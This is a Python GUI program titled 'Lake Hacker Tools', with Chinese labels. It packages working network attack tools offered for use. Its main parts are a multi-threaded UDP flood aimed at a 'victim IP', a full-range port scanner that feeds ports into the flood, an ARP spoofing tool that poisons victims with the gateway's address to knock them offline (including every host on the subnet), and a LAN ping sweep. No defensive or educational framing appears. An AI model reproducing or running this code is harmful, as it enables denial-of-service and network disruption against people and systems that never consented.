import time
import threading 
import tkinter as tk
from tkinter import messagebox
import socket
import random
import tkinter.ttk
from tkinter.filedialog import askopenfilename
from tkinter.filedialog import asksaveasfilename
from scapy.all import *
import subprocess
import re
import platform

from scapy.layers.l2 import ARP, Ether

lock = threading.Lock()
openNum = 0
open_port = []
ddos_port_list = []
nmap_ok = False
ddos_thread_open_1 = False
ddos_thread_open_2 = False
nmap_open = False
ddos_size_1_random = False
ddos_size_2_random = False
arp_open = False
findip_ok = False
arp_ip_list = []
arp_many_ip = False

def error(string,parent):
    messagebox.showerror(title="错误",message=string,parent=parent)
def showinfo(string,parent):
    messagebox.showinfo(title="提示",message=string,parent=parent)
def ffloat(n):
    try:
        float(n)
        return True
    except:
        return False
def fint(n):
    try:
        int(n)
        return True
    except:
        return False
# 尝试获取IP
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.connect(('baidu.com', 80))
    ip = sock.getsockname()[0]
    sock.close()
except socket.error:
    ip = None

# 创建主窗口
root_main = tk.Tk()
root_main.title("LakeV0.2")
root_main.geometry("300x200")

# ddos窗口
def open_ddos_window():
    global ddos_size_1_random
    root_ddos = tk.Toplevel(root_main)
    root_ddos.geometry("710x400")
    root_ddos.title("ddos V2.0")
    def portscanner(host, port):
        global openNum,open_port
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            lock.acquire()
            openNum += 1
            open_port.append(port)
            lock.release()
            s.close()
        except:
            pass

    def nmap_main(ip,thread=65535,ports=range(65535)):
        global nmap_ok,open_port,openNum,nmap_open
        try:
            threads = []
            per = 1
            port_n = 0
            j['value'] = 0
            open_port = []
            openNum = 0
            nmap_end.set(f"扫描结果：共有{openNum}个端口开放")
            nmap_ok = False
            socket.setdefaulttimeout(1)
            for i in range(0, len(ports),thread):
                sub_ports = ports[i:i+thread]
                for port in sub_ports:
                    if nmap_open:
                        t = threading.Thread(target=portscanner, args=(ip, port))
                        threads.append(t)
                        t.start()
                        port_n += 1
                        nmap_jd.set(port_n/65535*100)
                        if float(nmap_jd.get()) >= per:
                            per += 1
                            j['value'] += 1
                    else:
                        return
                for t in threads:
                    t.join()
                threads = []
        except:
            pass
        nmap_end.set(f"扫描结果：共有{openNum}个端口开放")
        nmap_ok = True
        showinfo("扫描完毕",root_ddos)
        nmap_open = False
    def ddos(ip,port,sd,thread,size,ddos_num):
        def temp_1(num):
            global ddos_thread_open_1
            sent = 0
            if ddos_size_1_random:
                temp = size.split("~")
                s = int(temp[0])
                b = int(temp[1])
            while True:
                if ddos_thread_open_1:
                    if ddos_time_1.get()!="":
                        if time.time()-begin_time>=int(ddos_time_1.get()):
                            ddos_thread_open_1 = False
                    try:
                        if ddos_size_1_random:
                            bytes = random._urandom(random.randint(s,b))
                        else:
                            bytes = random._urandom(int(size))
                        sock.sendto(bytes,(ip,port))
                        sent = sent + 1
                        print (f"{num} 线程 已发送 {sent} 个 {len(bytes)} 字节 数据包到 {ip} 端口 {port}")
                        time.sleep((1000-sd)/2000)
                    except:
                        error("请检查网络是否正常",parent=root_ddos)
                        ddos_thread_open_1 = False
                else:
                    return
        def temp_2(num):
            global ddos_thread_open_2
            sent = 0
            if ddos_size_2_random:
                temp = size.split("~")
                s = int(temp[0])
                b = int(temp[1])
            while True:
                if ddos_thread_open_2:
                    if ddos_time_2.get()!="":
                        if time.time()-begin_time>=int(ddos_time_2.get()):
                            ddos_thread_open_2 = False
                    try:
                        if ddos_size_2_random:
                            bytes = random._urandom(random.randint(s,b))
                        else:
                            bytes = random._urandom(int(size))
                        sock.sendto(bytes,(ip,port))
                        sent = sent + 1
                        print (f"{num} 线程 已发送 {sent} 个 {len(bytes)} 字节 数据包到 {ip} 端口 {port}")
                        time.sleep((1000-sd)/2000)
                    except:
                        error("请检查网络是否正常",parent=root_ddos)
                        ddos_thread_open_2 = False
                else:
                    return
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        begin_time = time.time()
        if ddos_num == 1:
            for i in range(thread):
                threading.Thread(target=temp_1,args=(i+1,)).start()
        elif ddos_num == 2:
            for i in range(thread):
                threading.Thread(target=temp_2,args=(i+1,)).start()
    def start_ddos_1():
        global ddos_thread_open_1,ddos_size_1_random
        def start():
            for port in ddos_port_list:
                ddos(ddos_victimIP_1.get(),int(port),int(ddos_sd_1.get()),int(ddos_thread_1.get()),ddos_size_1.get(),1)
        if ddos_sd_1.get()!="" and 0<int(ddos_sd_1.get())<=1000:
            if fint(ddos_thread_1.get()):
                if "~" in ddos_size_1.get():
                    ddos_size_1_random = True
                    ddos_thread_open_1 = True
                    threading.Thread(target=start).start()
                else:
                    ddos_size_1_random = False
                    if fint(ddos_size_2.get()):
                        ddos_thread_open_1 = True
                        threading.Thread(target=start).start()
                    else:
                        error("请输入整数数据包",root_ddos)
            else:
                error("请输入整数线程",root_ddos)
        else:
            error("请输入整数速度（要小于等于1000和大于等于1）",root_ddos)
    def close_ddos_1():
        global ddos_thread_open_1
        ddos_thread_open_1 = False
        showinfo("已停止多端口攻击",root_ddos)
    def start_ddos_2():
        global ddos_thread_open_2,ddos_size_2_random
        def start():
            ddos(ddos_victimIP_2.get(),int(ddos_port_2.get()),int(ddos_sd_2.get()),int(ddos_thread_2.get()),ddos_size_2.get(),2)
        if ddos_victimIP_2.get()!="":
            if fint(ddos_port_2.get()):
                if ddos_sd_2.get()!="" and 0<int(ddos_sd_2.get())<=1000:
                    if fint(ddos_thread_2.get()):
                        if "~" in ddos_size_2.get():
                            ddos_size_2_random = True
                            ddos_thread_open_2 = True
                            threading.Thread(target=start).start()
                        else:
                            ddos_size_2_random = False
                            if fint(ddos_size_2.get()):
                                ddos_thread_open_2 = True
                                threading.Thread(target=start).start()
                            else:
                                error("请输入整数数据包",root_ddos)
                    else:
                        error("请输入整数线程",root_ddos)
                else:
                    error("请输入整数速度（要小于等于1000和大于等于1）",root_ddos)
            else:
                error("请输入整数端口",root_ddos)
        else:
            error("请输入受害者IP",root_ddos)
    def close_ddos_2():
        global ddos_thread_open_2
        ddos_thread_open_2 = False
        showinfo("已停止单端口攻击",root_ddos)
    def start_nmap():
        global nmap_open
        if nmap_open==False:
            if nmap_victimIP.get()!="":
                if nmap_thread.get()=="":
                    nmap_open = True
                    nmap_main(nmap_victimIP.get())
                elif fint(nmap_thread.get()):
                    nmap_open = True
                    nmap_main(nmap_victimIP.get(),int(nmap_thread.get()))
                else:
                    error("请输入整数",parent=root_ddos)
            else:
                error("请输入受害者IP",parent=root_ddos)
    def nmap():
        threading.Thread(target=start_nmap).start()
    def close_nmap():
        global nmap_open
        nmap_open = False
        showinfo("已停止扫描",parent=root_ddos)
    def save_file():
        if nmap_ok:
            save_path = asksaveasfilename(title='选择保存路径',initialfile=nmap_victimIP.get(),filetypes=[('txt文档','*.txt')],parent=root_ddos)
            if save_path != "":
                s = nmap_victimIP.get()
                for i in range(len(open_port)):
                    s += "\n" + str(open_port[i])
                open(save_path+".txt","w",encoding="utf-8").write(s)
                showinfo("保存成功",root_ddos)
        else:
            error("你还未扫描",root_ddos)
    def open_file():
        open_path = askopenfilename(title="选择文件",filetypes=[('txt文档','*.txt')],parent=root_ddos)
        if open_path!="":
            temp = open(open_path,"r").read()
            temp = temp.split("\n")
            num = 0
            for i in range(1,len(temp)):
                ddos_port_list.append(int(temp[i]))
                num+=1
            ddos_victimIP_1.set(temp[0])
            ddos_port_1.set(f"共有 {num} 个端口")

    ddos_victimIP_1 = tk.StringVar()
    ddos_port_1 = tk.StringVar()
    ddos_sd_1 = tk.StringVar()
    ddos_thread_1 = tk.StringVar()
    ddos_thread_1.set("1")
    ddos_size_1 = tk.StringVar()
    ddos_size_1.set("1490")
    ddos_time_1 = tk.StringVar()

    ddos_victimIP_2 = tk.StringVar()
    ddos_sd_2 = tk.StringVar()
    ddos_thread_2 = tk.StringVar()
    ddos_thread_2.set("1")
    ddos_size_2 = tk.StringVar()
    ddos_size_2.set("1490")
    ddos_port_2  = tk.StringVar()
    ddos_time_2 = tk.StringVar()

    nmap_victimIP = tk.StringVar()
    nmap_thread = tk.StringVar()
    nmap_jd = tk.StringVar()
    nmap_end = tk.StringVar()
    nmap_end.set(f"扫描结果：共有{openNum}个端口开放")

    tk.Label(root_ddos,text="多端口ddos").place(x=90,y=0)
    tk.Label(root_ddos,text="受害者IP：").place(x=0,y=30)
    tk.Label(root_ddos,textvariable=ddos_victimIP_1).place(x=70,y=30)
    tk.Label(root_ddos,text="攻击端口：").place(x=0,y=60)
    tk.Label(root_ddos,textvariable=ddos_port_1).place(x=70,y=60)
    tk.Label(root_ddos,text="速度：    ").place(x=0,y=90)
    tk.Entry(root_ddos,textvariable=ddos_sd_1).place(x=70,y=90)
    tk.Label(root_ddos,text="线程：    ").place(x=0,y=120)
    tk.Entry(root_ddos,textvariable=ddos_thread_1).place(x=70,y=120)
    tk.Label(root_ddos,text="数据包大小：").place(x=0,y=150)
    tk.Entry(root_ddos,textvariable=ddos_size_1,width=15).place(x=70,y=150)
    tk.Label(root_ddos,text="字节").place(x=185,y=150)
    tk.Label(root_ddos,text="攻击时长：").place(x=0,y=180)
    tk.Entry(root_ddos,textvariable=ddos_time_1,width=15).place(x=70,y=180)
    tk.Label(root_ddos,text="秒").place(x=185,y=180)
    tk.Button(root_ddos,text="导入文件",command=open_file).place(x=0,y=210)
    tk.Button(root_ddos,text="开始攻击",command=start_ddos_1).place(x=70,y=210)
    tk.Button(root_ddos,text="停止攻击",command=close_ddos_1).place(x=140,y=210)
    tk.Label(root_ddos,text="数据包大小可使用 \"114514~1919810\" 实现随机数据包大小").place(x=0,y=240)

    tk.Label(root_ddos,text="单端口ddos").place(x=320,y=0)
    tk.Label(root_ddos,text="受害者IP：").place(x=220,y=30)
    tk.Entry(root_ddos,textvariable=ddos_victimIP_2).place(x=290,y=30)
    tk.Label(root_ddos,text="端口：").place(x=220,y=60)
    tk.Entry(root_ddos,textvariable=ddos_port_2).place(x=290,y=60)
    tk.Label(root_ddos,text="速度：    ").place(x=220,y=90)
    tk.Entry(root_ddos,textvariable=ddos_sd_2).place(x=290,y=90)
    tk.Label(root_ddos,text="线程：    ").place(x=220,y=120)
    tk.Entry(root_ddos,textvariable=ddos_thread_2).place(x=290,y=120)
    tk.Label(root_ddos,text="数据包大小：").place(x=220,y=150)
    tk.Entry(root_ddos,textvariable=ddos_size_2,width=15).place(x=290,y=150)
    tk.Label(root_ddos,text="字节").place(x=405,y=150)
    tk.Label(root_ddos,text="攻击时长：").place(x=220,y=180)
    tk.Entry(root_ddos,textvariable=ddos_time_2,width=15).place(x=290,y=180)
    tk.Label(root_ddos,text="秒").place(x=405,y=180)
    tk.Button(root_ddos,text="开始攻击",command=start_ddos_2).place(x=250,y=210)
    tk.Button(root_ddos,text="停止攻击",command=close_ddos_2).place(x=330,y=210)

    tk.Label(root_ddos,text="端口扫描").place(x=550,y=0)
    tk.Label(root_ddos,text="受害者IP：").place(x=440,y=30)
    tk.Entry(root_ddos,textvariable=nmap_victimIP).place(x=500,y=30)
    tk.Label(root_ddos,text="扫描线程：").place(x=440,y=60)
    tk.Entry(root_ddos,textvariable=nmap_thread).place(x=500,y=60)
    tk.Button(root_ddos,text="开始扫描",command=nmap).place(x=440,y=90)
    tk.Button(root_ddos,text="停止扫描",command=close_nmap).place(x=510,y=90)
    tk.Label(root_ddos,text="扫描进度：").place(x=440,y=120)
    tk.Label(root_ddos,textvariable=nmap_jd).place(x=500,y=120)
    j=tkinter.ttk.Progressbar(root_ddos,length=250)
    j.place(x=450,y=150)
    j['maximum']=100
    j['value']=0
    tk.Label(root_ddos,textvariable=nmap_end).place(x=440,y=180)
    tk.Button(root_ddos,text="导出ddos文件",command=save_file).place(x=580,y=90)

    root_ddos.mainloop()

# arp窗口
def open_arp_window():
    root_arp = tk.Toplevel(root_main)
    root_arp.title("arpV0.1")
    root_arp.geometry("400x300")

    def arp(victimIP, gatewayIP, sleep):
        try:
            packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, psrc=gatewayIP, pdst=victimIP)
            while True:
                if arp_open:
                    sendp(packet, verbose=False)
                    time.sleep(sleep)
                    print(packet.show())
                else:
                    return
        except Exception as e:
            error(e,root_arp)
        
    def start_arp():
        global arp_open
        def start():
            if arp_many_ip:
                for i in range(len(arp_ip_list)):
                    threading.Thread(target=arp,args=(arp_ip_list[i],arp_gatewayIP.get(),int(arp_time.get()))).start()
            else:
                arp(arp_victimIP.get(),arp_gatewayIP.get(),int(arp_time.get()))
        if arp_victimIP.get()!="" or arp_many_ip==True:
            if arp_gatewayIP.get()!="":
                if float(arp_time.get()):
                    arp_open = True
                    threading.Thread(target=start).start()
                else:
                    error("请输入数字",root_arp)
            else:
                error("请输入网关IP",root_arp)
        else:
            error("请输入受害者IP",root_arp)
    def close_arp():
        global arp_open
        arp_open = False
        showinfo("已关闭arp欺骗",root_arp)
    def get_gatewayIP():
        result = subprocess.run(['route', 'print'], capture_output=True, text=True)
        output = result.stdout
        gateway_pattern = r"0.0.0.0\s+0.0.0.0\s+(\d+\.\d+\.\d+\.\d+)"
        gateway_match = re.search(gateway_pattern, output)
        if gateway_match:
            default_gateway = gateway_match.group(1)
        if default_gateway:
            arp_gatewayIP.set(default_gateway)
        else:
            error("找不到网关",root_arp)
    def open_ipfile():
        global arp_many_ip
        open_path = askopenfilename(title="选择文件",filetypes=[('txt文档','*.txt')],parent=root_arp)
        if open_path!="":
            temp = open(open_path,"r").read()
            temp = temp.split("\n")
            for i in range(len(temp)):
                arp_ip_list.append(temp[i])
            arp_many_ip = True
            many_victimIP.set(f"共 {len(temp)} 个IP")
            victimIP_e.place_forget()
            close_many_victimI_b.place(x=300,y=30)
    def close_ipfile():
        global arp_many_ip
        arp_many_ip = False
        victimIP_e.place(x=70,y=30)
        close_many_victimI_b.place_forget()
    def make_allipfile():
        save_path = asksaveasfilename(title='选择保存路径',initialfile=ip,filetypes=[('txt文档','*.txt')],parent=root_arp)
        if save_path != "":
            s = ""
            ip_parts = ip.split('.')
            ip_prefix = '.'.join(ip_parts[:-1])
            for i in range(255):
                s += ip_prefix + "." + str(i) + "\n"
            s += ip_prefix + ".255"
            open(save_path+".txt","w",encoding="utf-8").write(s)
            showinfo("保存成功",root_arp)

    arp_victimIP = tk.StringVar()
    arp_gatewayIP = tk.StringVar()
    arp_time = tk.StringVar()
    arp_time.set("1")
    many_victimIP = tk.StringVar()
    
    tk.Label(root_arp,text="arp断网").place(x=90,y=0)
    tk.Label(root_arp,text="受害者IP：").place(x=0,y=30)
    tk.Label(root_arp,textvariable=many_victimIP).place(x=70,y=30)
    victimIP_e = tk.Entry(root_arp,textvariable=arp_victimIP)
    victimIP_e.place(x=70,y=30)
    tk.Label(root_arp,text="网关IP：").place(x=0,y=60)
    tk.Entry(root_arp,textvariable=arp_gatewayIP).place(x=70,y=60)
    tk.Label(root_arp,text="发送间隔：").place(x=0,y=90)
    tk.Entry(root_arp,textvariable=arp_time).place(x=70,y=90)
    tk.Button(root_arp,text="开始arp欺骗",command=start_arp).place(x=20,y=120)
    tk.Button(root_arp,text="关闭arp欺骗",command=close_arp).place(x=110,y=120)
    tk.Button(root_arp,text="获取网关",command=get_gatewayIP).place(x=230,y=60)
    tk.Button(root_arp,text="导入多个IP",command=open_ipfile).place(x=230,y=30)
    close_many_victimI_b = tk.Button(root_arp,text="关闭多个IP",command=close_ipfile)
    tk.Button(root_arp,text="生成全部IP地址",command=make_allipfile).place(x=230,y=0)

    root_arp.mainloop()
# 查看同局域网的活主机窗口
def open_findip_window():
    root_findip = tk.Toplevel(root_main)
    root_findip.title("查看同局域网的活主机V0.1")
    root_findip.geometry("400x300")

    ip_showing = tk.StringVar()
    ip_show = tk.StringVar()

    def start_find():
        global findip_ok
        def start():
            global findip_ok
            try:
                def ping(host):
                    ping_cmd = f"ping -n 1 {host}" if platform.system().lower() == "windows" else f"ping -c 1 {host}"
                    try:
                        output = subprocess.check_output(ping_cmd, shell=True, universal_newlines=True)
                        if "TTL=" in output:
                            return True
                    except subprocess.CalledProcessError:
                        pass
                    return False
                def scan_host(ip, active_hosts):
                    if ping(ip):
                        active_hosts.append(ip)
                ip_parts = ip.split('.')
                ip_prefix = '.'.join(ip_parts[:-1])
                active_hosts = []
                threads = []
                for i in range(1, 256):
                    ip_t = ip_prefix + '.' + str(i)
                    thread = threading.Thread(target=scan_host, args=(ip_t, active_hosts))
                    thread.start()
                    threads.append(thread)
                for thread in threads:
                    thread.join()
                s = ""
                for i in range(len(active_hosts)):
                    s += active_hosts[i]+"\n"
                findip_ok = True
                ip_show.set(s)
                ip_showing.set("扫描完毕")
                showinfo("扫描完毕",root_findip)
            except Exception as e:
                error(e,root_findip)
        findip_ok = False
        ip_showing.set("扫描中...")
        threading.Thread(target=start).start()
    def save_ipfile():
        if findip_ok:
            save_path = asksaveasfilename(title='选择保存路径',initialfile=ip,filetypes=[('txt文档','*.txt')],parent=root_findip)
            if save_path != "":
                s = ip_show.get()
                open(save_path+".txt","w",encoding="utf-8").write(s)
                showinfo("保存成功",root_findip)
        else:
            error("你还未扫描",root_findip)
    tk.Button(root_findip,text="开始查找",command=start_find).place(x=170,y=0)
    tk.Label(root_findip,textvariable=ip_show).place(x=0,y=30)
    tk.Label(root_findip,textvariable=ip_showing).place(x=250,y=0)
    tk.Button(root_findip,text="导出IP地址",command=save_ipfile).place(x=0,y=0)
    root_findip.mainloop()
tk.Label(root_main,text="Lake Hacker Tools 给你一个黑客的世界").place(x=0,y=0)
tk.Button(root_main,text="ddos",command=open_ddos_window).place(x=0,y=30)
tk.Button(root_main,text="arp欺骗",command=open_arp_window).place(x=0,y=60)
tk.Button(root_main,text="查看同局域网的活主机",command=open_findip_window).place(x=165,y=30)
tk.Label(root_main,text=f"你的IP：{ip}").place(x=0,y=180)

root_main.mainloop()
